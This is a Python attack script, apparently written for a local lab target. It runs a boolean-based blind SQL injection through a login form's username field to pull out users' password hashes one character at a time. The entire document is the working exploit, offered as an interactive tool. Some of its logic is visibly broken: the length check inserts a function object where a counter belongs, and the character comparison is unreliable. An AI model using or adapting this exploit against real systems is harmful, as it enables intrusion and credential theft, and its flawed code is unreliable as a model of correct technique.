#!/bin/python3
# Exploiting an SQL Injection
# Meistsec 10/2022

import requests

total_queries = 0
charset = "0123456789abcdef"
target = "http://127.0.0.1:5000"
needle = "Welcome back"

# Performs an injected query toward the web application and identify
# from the response whether the response was valid or invalid
def injected_query(payload):
	global total_queries
	r = requests.post(target, data={"username" : "admin' and {}--".format(payload), "password":"password"})
	total_queries += 1
	return needle.encode() not in r.content

# Boolean query which identifies at a certain offset whether a character is
# valid or invalid
def boolean_query(offset, user_id, character, operator=">"):
	payload = "(select hex(substr(password,{},1)) from user where id = {}) {} hex('{}')".format(offset+1, user_id, operator, character)
	return injected_query(payload)

# Function to identify whether a user id is valid or invalid 
def invalid_user(user_id):
	payload = "(select id from user where id = {}) >= 0".format(user_id)
	return injected_query(payload)

# Function to identify the users password length
def password_length(user_id):
	i = 0
	while True:
		payload = "(select length(password) from user where id = {} and length(password) <= {} limit 1)".format(user_id, injected_query)
		if not injected_query(payload):
			return i
		i += 1

# Function to extract a users hash based on a charset, userid, and pass length
# This iterates over each index in the users password hash and extract the valid character
def extract_hash(charset, user_id, password_length):
	found = ""
	for i in range(0, password_length):
		for j in range(len(charset)):
			if boolean_query(i, user_id, charset[j]):
				found += charset[j]
				break
	return found

# Function for debugging and logging to see how many queries are taken
def total_queries_taken():
	global total_queries
	print("\t\t[! {} total_queries!".format(total_queries))
	total_queries = 0

# Infinite Loop
while True:
	try:
		user_id = input("> Enter a user ID to extract the password hash: ")
		if not invalid_user(user_id):
			user_password_length = password_length(user_id)
			print("\t[-] User {} hash length: {}".format(user_id, user_password_length))
			total_queries_taken()
			print("\t[-] User {} hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
			total_queries_taken()
		else:
			print("\t[X] User {} does not exist!".format(user_id))
	except KeyboardInterrupt:
		break